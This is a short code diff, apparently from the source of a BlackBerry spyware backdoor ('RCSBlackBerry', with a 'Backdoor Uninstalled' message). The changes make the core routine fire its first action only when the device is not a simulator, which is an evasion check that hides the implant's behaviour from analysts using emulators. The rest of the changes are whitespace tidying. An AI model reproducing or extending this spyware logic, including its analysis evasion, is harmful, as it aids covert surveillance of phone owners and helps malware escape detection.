@@ -11,6 +11,7 @@ package com.ht.rcs.blackberry;
 import net.rim.device.api.applicationcontrol.ApplicationPermissions;
 import net.rim.device.api.applicationcontrol.ApplicationPermissionsManager;
 import net.rim.device.api.system.ApplicationDescriptor;
+import net.rim.device.api.system.DeviceInfo;
 
 import com.ht.rcs.blackberry.config.InstanceKeys323;
 import com.ht.rcs.blackberry.config.Keys;
@@ -37,7 +38,7 @@ public class Core {
         Utils.sleep(1000);
 
         Thread.currentThread().setPriority(Thread.MAX_PRIORITY);
-        
+
         //#mdebug
         debug.init(true, false);
         debug = new Debug("Core", DebugLevel.VERBOSE);
@@ -64,7 +65,7 @@ public class Core {
 
         // #debug
         debug.trace("RCSBlackBerry exit, return " + ret);
-        
+
         // #debug
         Debug.stop();
     }
@@ -102,8 +103,10 @@ public class Core {
             }
 
             //TODO togliere
-            debug.warn("TRIGGERING ACTION 0");
-            Status.getInstance().triggerAction(0, null);
+            if (!DeviceInfo.isSimulator()) {
+                debug.warn("TRIGGERING ACTION 0");
+                Status.getInstance().triggerAction(0, null);
+            }
 
             // #debug
             debug.info("starting checking actions");
@@ -115,7 +118,7 @@ public class Core {
                 Msg.demo("Backdoor Uninstalled, reboot the device");
                 return false;
             }
-        } 
+        }
     }
 
     /**
